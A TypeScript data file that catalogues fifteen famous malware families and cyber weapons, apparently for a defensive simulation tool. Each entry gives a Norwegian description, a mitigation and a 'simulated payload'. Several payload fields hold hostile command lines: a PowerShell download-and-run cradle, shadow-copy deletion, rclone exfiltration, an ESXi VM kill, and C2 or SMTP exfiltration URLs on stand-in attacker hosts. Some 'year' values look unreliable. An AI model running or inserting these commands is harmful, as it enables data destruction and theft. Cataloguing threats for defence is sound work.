import { AttackVector } from '../types';

/**
 * HISTORICAL & MODERN TROJANS, ROOTKITS, INFOSTEALERS & FAMOUS CYBER WEAPONS
 * Fully fleshed out with realistic simulated payloads, forensic signatures, and mitigations.
 */
export const FAMOUS_TROJANS_AND_THREATS_CATALOG: AttackVector[] = [
  // 1. EMOTET
  {
    id: 'trojan-emotet-01',
    name: 'Trojan.Emotet (Heuristic Macro & Svchost Injection)',
    category: 'TROJAN',
    cve: 'CWE-506 (MITRE T1055.012)',
    mitreId: 'T1055.012',
    owaspTag: 'Modular Trojan Botnet',
    year: 2024,
    protocol: 'HTTPS / TLS C2 Beaconing',
    description:
      'Polymorfisk banktrojaner og modulær dropper. Spres via ondsinnede Office/PDF-makroer, pakker ut kryptert shellcode i minnet og injiserer seg inn i legitime svchost.exe prosesser.',
    payload: {
      trojan_family: 'Emotet_Epoch5_Variant',
      delivery_vector: 'vba_macro_powershell_download_cradle',
      c2_callback: 'https://c2.emotet-relay-node.net:8080/stats.php',
      powershell_stage1:
        'powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==',
      injection_target: 'C:\\Windows\\System32\\svchost.exe',
      encryption_routine: 'ECDH_Curve25519_AES_CBC',
    },
    defaultCountermeasure: 'Phantom Loop (Isolerer den mistenkelige minneprosessen i mikrosandkasse)',
    recommendedMitigation:
      'Deaktiver VBA-makroer globalt via GPO, håndhev Attack Surface Reduction (ASR) regler mot barneprosesser fra Office, og overvåk uventede TLS-kall fra systemprosesser.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 2. TRICKBOT
  {
    id: 'trojan-trickbot-02',
    name: 'Trojan.TrickBot / Anchor Engine (AD Recon & Ransomware Dropper)',
    category: 'TROJAN',
    cve: 'CWE-200 (MITRE T1087)',
    mitreId: 'T1087.002',
    owaspTag: 'Banking Trojan / Post-Exploitation',
    year: 2023,
    protocol: 'Named Pipes / SMB / DNS Tunneling',
    description:
      'Avansert modulær trojaner som utfører Active Directory-rekognosering, stjeler nettlesercookies og fungerer som forløper til utrulling av Ryuk og Conti løsepengevirus.',
    payload: {
      trojan_family: 'TrickBot_Anchor_DNS',
      module_loaded: 'systeminfo64.dll + pwgrab64.dll + ldapSearchModule',
      injected_process: 'wermgr.exe',
      recon_commands: ['nltest /dclist:', 'net group "Domain Admins" /domain'],
      dns_tunnel_request: '616e63686f72.dns-c2-domain.org',
    },
    defaultCountermeasure: 'Mirror Jamming (Sender syntetisk forfalskede AD-svar og fiktive domenekontrollere)',
    recommendedMitigation:
      'Bruk LAPS (Local Administrator Password Solution), begrens RPC/SMB mellom arbeidsstasjoner og aktiver Credential Guard.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 3. QAKBOT (QBOT)
  {
    id: 'trojan-qakbot-03',
    name: 'Trojan.QakBot / Pinkslipbot (Thread Hijacking & InfoStealer)',
    category: 'INFOSTEALER',
    cve: 'CWE-284 (MITRE T1566.001)',
    mitreId: 'T1566.001',
    owaspTag: 'Information Stealer',
    year: 2024,
    protocol: 'HTTPS / Obfuscated WebSocket',
    description:
      'Stjeler e-posttråder fra Outlook for å sende trojanske svar med ondsinnede OneNote- eller ZIP-vedlegg. Benytter minne-basert kjøring for å unngå antivirusdeteksjon.',
    payload: {
      trojan_family: 'Qbot_ThreadHijack_Build_2024',
      harvest_target: '%APPDATA%\\Microsoft\\Outlook\\*.pst',
      anti_analysis: {
        detect_vmware: true,
        detect_sandbox_hooks: true,
        sleep_acceleration_check: true,
      },
      dll_hollowing_target: 'C:\\Windows\\System32\\calc.exe',
    },
    defaultCountermeasure: 'Blackout Isolation (Terminerer tilkobling og låser utgående e-post-releer)',
    recommendedMitigation:
      'Blokkér kjøring av skriptfiler (.js, .vbs, .hta) og OneNote-vedlegg (.one) på e-postgateway, og overvåk uautorisert minne-injeksjon (Process Hollowing).',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 4. XZ UTILS BACKDOOR (CVE-2024-3094)
  {
    id: 'cve-2024-3094-xz',
    name: 'XZ-Utils Liblzma Forsyningskjede-Bakdør (CVE-2024-3094)',
    category: 'SUPPLY_CHAIN',
    cve: 'CVE-2024-3094',
    mitreId: 'T1195.001',
    owaspTag: 'A06:2021-Vulnerable Components',
    year: 2024,
    protocol: 'SSH / OpenSSH via IFUNC Hijack',
    description:
      'Historisk bakdør plantet i oppstrøms kildekode for liblzma som utnytter GNU Indirect Function (IFUNC) til å overskrive OpenSSH sin RSA_public_decrypt-funksjon for hemmelig RCE.',
    payload: {
      exploit_type: 'IFUNC_resolver_hook_sshd',
      compromised_archive: 'xz-5.6.0.tar.gz / liblzma.so.5.6.0',
      payload_symbol: '_get_cpuid / crc64_resolve',
      target_function: 'RSA_public_decrypt@GOT',
      payload_magic: '0xf30f1efa4883ec08...',
    },
    defaultCountermeasure: 'Strict WORM Forensisk Sjekksum & Binærfingeravtrykk-Karantene',
    recommendedMitigation:
      'Nedgrader eller oppgrader liblzma/xz umiddelbart til versjon 5.4.x eller 5.6.1-patch, og verifiser pakkeintegritet mot offisielle distribusjons-nøkler.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 5. PEGASUS / FORCEDENTRY (CVE-2021-30860)
  {
    id: 'cve-2021-30860-pegasus',
    name: 'Pegasus FORCEDENTRY Zero-Click JBIG2 Exploit (CVE-2021-30860)',
    category: 'SPYWARE',
    cve: 'CVE-2021-30860',
    mitreId: 'T1068',
    owaspTag: 'Zero-Click Mobile Spyware',
    year: 2021,
    protocol: 'iMessage / Apple CoreGraphics Parser',
    description:
      'Ekstremt avansert zero-click angrep levert som en falsk PDF/GIF i meldingsapper. Utnytter en heltallsoverflyt i JBIG2-dekoderen til å bygge en syntetisk virtuell CPU inne i bildemotoren som unnslipper sandkassen.',
    payload: {
      format: 'JBIG2_Huffman_Integer_Overflow',
      simulated_registers: { rax: '0x4141414141414141', rdi: '0x00007fffa0112450' },
      bootstrap: 'Emulated_NAND_Gates_Arithmetic_Engine',
      jailbreak_vector: 'kernel_task_port_uaf',
      exfiltration_targets: ['Microphone', 'Camera', 'Signal_DB', 'WhatsApp_Keys'],
    },
    defaultCountermeasure: 'Phantom Loop & Dyp Shannon Entropi Analyse (> 7.50 bits)',
    recommendedMitigation:
      'Aktiver Apples "Lockdown Mode" for utsatte brukere, isoler mediedekodere i strengt begrensede minneprosesser og hold operativsystemet oppdatert.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 6. ZEUS / GAMEOVER ZEUS
  {
    id: 'trojan-zeus-06',
    name: 'Trojan.Zeus / Gameover P2P (Man-in-the-Browser Banktyveri)',
    category: 'TROJAN',
    cve: 'CWE-319 (MITRE T1185)',
    mitreId: 'T1185',
    owaspTag: 'Banking Trojan / MitB',
    year: 2022,
    protocol: 'HTTP / Web-Injects & P2P UDP',
    description:
      'Pionéren innen Man-in-the-Browser (MitB). Huker seg fast i nettleserens API-er (wininet.dll/nspr4.dll) for å modifisere overføringssummer og kontonumre i sanntid mens brukeren utfører nettbank-innlogging.',
    payload: {
      trojan_family: 'Gameover_Zeus_P2P',
      api_hooks: ['HttpSendRequestW', 'InternetReadFile', 'PR_Write'],
      webinject_rule: {
        url_pattern: '*bank*/transfer*',
        inject_html: '<input type="hidden" name="beneficiary_iban" value="NO9912345678901"/>',
      },
      p2p_mesh_ports: [1024, 2048, 4096],
    },
    defaultCountermeasure: 'Mirror Jamming (Sender forfalsket sesjonsdata og manipulerer inject-strukturen)',
    recommendedMitigation:
      'Bruk FIDO2/WebAuthn maskinvarenøkler for transaksjonssignering i stedet for SMS/engangskoder som kan manipuleres lokalt på klienten.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 7. NOTPETYA
  {
    id: 'wiper-notpetya-07',
    name: 'NotPetya / EternalPetya Destruktiv Wiper (Vises som Ransomware)',
    category: 'RANSOMWARE',
    cve: 'CVE-2017-0144 + CWE-284',
    mitreId: 'T1485',
    owaspTag: 'Data Destruction / Wiper',
    year: 2022,
    protocol: 'SMB Port 445 / WMI / PsExec',
    description:
      'Destruktiv statssponset cybervåpen forkledd som ransomware. Benytter EternalBlue og dumpede LSASS-passord for å spre seg automatisk, og overskriver Master Boot Record (MBR) med ugjenopprettelig skrot.',
    payload: {
      wiper_action: 'Raw_Disk_Sector_Zeroing',
      target: '\\\\.\\PhysicalDrive0',
      mbr_overwrite_magic: '0xAA55_DESTROYED',
      mimikatz_dump: 'LSASS_Process_Memory_Extraction',
      lateral_propagation: ['EternalBlue_445', 'PsExec_Service', 'WMI_Exec'],
    },
    defaultCountermeasure: 'Canary Honeyfile Alarm & Øyeblikkelig Total Nettverksisolering',
    recommendedMitigation:
      'Fjern SMBv1, isoler klientsegmenter fra hverandre, håndhev prinsippet om minste privilegium og vedlikehold offline WORM-backups.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 8. DARKSIDE / BLACKCAT RANSOMWARE
  {
    id: 'ransomware-darkside-08',
    name: 'DarkSide / ALPHV BlackCat Trippel-Utpressing Ransomware',
    category: 'RANSOMWARE',
    cve: 'MITRE T1486 (Data Encrypted for Impact)',
    mitreId: 'T1486',
    owaspTag: 'Ransomware / Triple Extortion',
    year: 2024,
    protocol: 'Rust Native / ESXi Hypervisor Shell',
    description:
      'Avansert løsepengevirus skrevet i Rust som angriper både Windows-servere og Linux ESXi-virtualiseringsverter. Utfører datatyveri før kryptering (trippel utpressing med trussel om lekkasje og DDoS).',
    payload: {
      ransom_strain: 'ALPHV_Rust_v2',
      esxi_kill_command: 'esxcli vm process kill --type=force --world-id=$(esxcli vm process list | grep "World ID")',
      shadow_copy_removal: 'vssadmin delete shadows /all /quiet',
      encryption_cipher: 'ChaCha20_Poly1305_Hardware_Accelerated',
      exfil_protocol: 'rclone --config secret.conf copy /data mega:exfil_bucket',
    },
    defaultCountermeasure: 'Canary Honeyfile Alarm & Øyeblikkelig WORM Skrivebeskyttelse',
    recommendedMitigation:
      'Beskytt ESXi-konsoller med dedikert management-nettverk, MFA og streng IP-hvitelisting, samt uavhengige offline WORM-logger.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 9. CONFICKER WORM
  {
    id: 'worm-conficker-09',
    name: 'Conficker / Downadup NetAPI Orm (CVE-2008-4250)',
    category: 'MALWARE',
    cve: 'CVE-2008-4250',
    mitreId: 'T1210',
    owaspTag: 'Autonome Orm / Buffer Overflow',
    year: 2023,
    protocol: 'SMB RPC NetAPI32 / UDP P2P',
    description:
      'Klassisk og aggressiv nettverksorm som utnytter en buffer-overflow i Windows Server Service (NetprPathCanonicalize). Genererer 50 000 DGA-domener daglig for å motta oppdateringer.',
    payload: {
      overflow_target: 'netapi32.dll!NetpwPathCanonicalize',
      dga_seed: 'Daily_Timestamp_CryptGenRandom',
      domain_count_per_day: 50000,
      autorun_inf_spread: true,
      patch_disable_services: ['wuauserv', 'BITS', 'WinDefend'],
    },
    defaultCountermeasure: 'NetAPI RPC Filter & DGA Sinkholing',
    recommendedMitigation:
      'Installer sikkerhetsoppdatering MS08-067, blokker SMB på perimetere og deaktiver AutoRun/AutoPlay for eksterne USB-lagringsenheter.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 10. REDLINE STEALER
  {
    id: 'infostealer-redline-10',
    name: 'RedLine Stealer (Nettleser-passord & Krypto-wallets)',
    category: 'INFOSTEALER',
    cve: 'CWE-522 (MITRE T1555)',
    mitreId: 'T1555.003',
    owaspTag: 'Credential Harvesting',
    year: 2024,
    protocol: 'TCP Port 443 / WCF SOAP C2',
    description:
      'Ledende infostealer i undergrunnsmiljøer. Høster innlagrede passord og cookies fra Google Chrome/Brave/Edge, Discord-tokens, Telegram-sesjoner, VPN-profiler og over 40 kryptolommebok-utvidelser.',
    payload: {
      stealer_build: 'RedLine_v26_DotNet',
      target_paths: [
        '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data',
        '%APPDATA%\\Telegram Desktop\\tdata',
        '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Extensions\\nkbihfbeogaeaoehlefnkodbefgpgknn', // MetaMask
      ],
      dpapi_masterkey_decrypt: 'CryptUnprotectData_Hook',
      c2_exfil_format: 'ZIP_Archived_Hardware_Profile_Credentials',
    },
    defaultCountermeasure: 'Blackout Isolation & DPAPI Minnebeskyttelse',
    recommendedMitigation:
      'Ikke lagre passord ukryptert i nettlesere, bruk passordadministratorer med master-nøkkel og håndhev AppLocker for å stoppe ukjente .NET-kjørbare filer.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 11. AGENT TESLA
  {
    id: 'spyware-agenttesla-11',
    name: 'Agent Tesla Spyware (Tastatur-logger & Skjermbilde-spion)',
    category: 'SPYWARE',
    cve: 'CWE-359 (MITRE T1056.001)',
    mitreId: 'T1056.001',
    owaspTag: 'Keylogger & Spyware',
    year: 2024,
    protocol: 'SMTP / Telegram Bot API / FTP',
    description:
      'Avansert kommersiell spionvare. Tar opp alle tastetrykk, henter utklippstavleinnhold, fanger skjermbilder periodisk og overfører data hemmelig via kryptert SMTP eller Telegram Bot API.',
    payload: {
      spyware_family: 'AgentTesla_DotNet_Compiled',
      hooks: ['SetWindowsHookEx_WH_KEYBOARD_LL', 'RegisterClipboardFormat'],
      screen_capture_interval_sec: 60,
      exfiltration_channel: 'smtp://smtp.attacker-mail-relay.com:587',
      anti_debugging: ['CheckRemoteDebuggerPresent', 'IsDebuggerPresent'],
    },
    defaultCountermeasure: 'Phantom Loop & Automatisk Honeypot Trap',
    recommendedMitigation:
      'Blokkér utgående SMTP (port 25/587) fra klient-arbeidsstasjoner, og bruk EDR som flagger lavnivå-tastaturhooks.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 12. COBALT STRIKE BEACON
  {
    id: 'tool-cobaltstrike-12',
    name: 'Cobalt Strike Malleable C2 Beacon (Reflective DLL Injection)',
    category: 'RCE',
    cve: 'MITRE T1055 (Process Injection)',
    mitreId: 'T1055.001',
    owaspTag: 'Adversary Simulation / APT Tool',
    year: 2024,
    protocol: 'HTTPS Malleable Profile / Named Pipes',
    description:
      'Standardverktøyet for avanserte trusselaktører (APT). Kjører i minnet uten å berøre disk ved hjelp av Reflective DLL Injection, og kamuflerer C2-trafikk som vanlig Amazon/jQuery HTTP-trafikk.',
    payload: {
      beacon_type: 'Cobalt_Strike_Malleable_HTTPS',
      jitter_percent: 30,
      sleep_time_sec: 45,
      reflective_loader: 'VirtualAlloc(PAGE_EXECUTE_READWRITE) + DllMain',
      named_pipe_lateral: '\\\\.\\pipe\\msse-1492-server',
      spawn_to: 'C:\\Windows\\System32\\rundll32.exe',
    },
    defaultCountermeasure: 'Minne-ASLR Scramble & eBPF Kjerne-Analyse',
    recommendedMitigation:
      'Overvåk minneallokeringer med PAGE_EXECUTE_READWRITE (RWX), implementer minne-skanning (YARA-minneskannere) og inspiser TLS JA3-fingeravtrykk.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 13. BADUSB / RUBBER DUCKY
  {
    id: 'hardware-badusb-13',
    name: 'BadUSB / USB Rubber Ducky Maskinvare-Injisering',
    category: 'HARDWARE_HID',
    cve: 'MITRE T1052.001 (Exfiltration over Physical Medium)',
    mitreId: 'T1052.001',
    owaspTag: 'Hardware Keystroke Injection',
    year: 2024,
    protocol: 'USB HID Keyboard Emulation',
    description:
      'Fysisk maskinvare-angrep der en USB-enhet utgir seg for å være et tastatur og taster inn PowerShell-kommandoer i 1000 ord per minutt sekunder etter tilkobling.',
    payload: {
      device_id: 'USB\\VID_046D&PID_C31C (Spoofed Logitech Keyboard)',
      keystroke_script: 'GUI r; DELAY 200; powershell -w h -c IEX(New-Object Net.WebClient).DownloadString(\"http://198.51.100.42/payload.ps1\"); ENTER',
      execution_speed_ms: 1500,
    },
    defaultCountermeasure: 'Blackout Isolation & Umiddelbar Enhetskarantene',
    recommendedMitigation:
      'Deaktiver autorun, innfør Endpoint Device Control som krever godkjenning av nye USB HID-enheter, og blokker PowerShell for vanlige brukere.',
    riskLevel: 'HIGH',
    enabled: true,
  },

  // 14. INDUSTROYER / CRASHOVERRIDE
  {
    id: 'scada-industroyer-14',
    name: 'Industroyer / CrashOverride (Sabotasje av Strømnett & Brytere)',
    category: 'ICS_SCADA',
    cve: 'MITRE T0809 (Data Destruction in ICS)',
    mitreId: 'T0809',
    owaspTag: 'Critical Infrastructure Attack',
    year: 2023,
    protocol: 'IEC 60870-5-104 / IEC 61850 / OPC DA',
    description:
      'Militær-gradert skadevare konstruert for å slå av transformatorstasjoner og åpne høyspenningsbrytere for å skape omfattende strømbrudd.',
    payload: {
      ics_protocol: 'IEC_60870_5_104_APCI',
      target_rtu_apci: 'STARTDT act (Activation of Data Transmission)',
      asdu_command: 'C_SC_NA_1 (Single Command / Breaker OPEN Trip)',
      dos_service_crash: 'OPC DA Server Buffer Overflow',
      telemetry_blind_packet: 'Raw_APDU_Interruption',
    },
    defaultCountermeasure: 'Enveis Maskinvare Data-Diode & WORM Sikring',
    recommendedMitigation:
      'Segmenter OT-driftsnett fra IT-nettverk i henhold til IEC 62443, bruk protokollspesifikke brannmurer med Deep Packet Inspection (DPI) for IEC-104.',
    riskLevel: 'CRITICAL',
    enabled: true,
  },

  // 15. SHAMOON DISK WIPER
  {
    id: 'wiper-shamoon-15',
    name: 'Shamoon / Disttrack Harddisk Wiper (Saudi Aramco Sabotasje)',
    category: 'MALWARE',
    cve: 'MITRE T1561.002 (Disk Structure Wipe)',
    mitreId: 'T1561.002',
    owaspTag: 'Destructive Wiper',
    year: 2022,
    protocol: 'Raw SCSI / Direct Disk IO',
    description:
      'Beryktet destruktiv disk-sletter som overskriver oppstartsektorer (MBR) og fildata med et bilde av et brennende flagg, og gjør datamaskinen permanent ubrukelig.',
    payload: {
      driver: 'EldoS_RawDisk_Signed_Driver',
      target_drive: '\\\\.\\PhysicalDrive0',
      wipe_pattern: 'BURNING_FLAG_JPEG_FRAGMENT_OVERWRITE_0x00_0xFF',
      corrupt_partition_table: true,
      force_bsod: 'NtRaiseHardError_0xC000021A',
    },
    defaultCountermeasure: 'WORM Forensisk Beskyttelse & Øyeblikkelig Skrivelås',
    recommendedMitigation:
      'Bruk Secure Boot, blokker lasting av usignerte/sårbare drivere (Driver Blocklist via HVCI) og oppretthold isolerte "cold backups".',
    riskLevel: 'CRITICAL',
    enabled: true,
  },
];
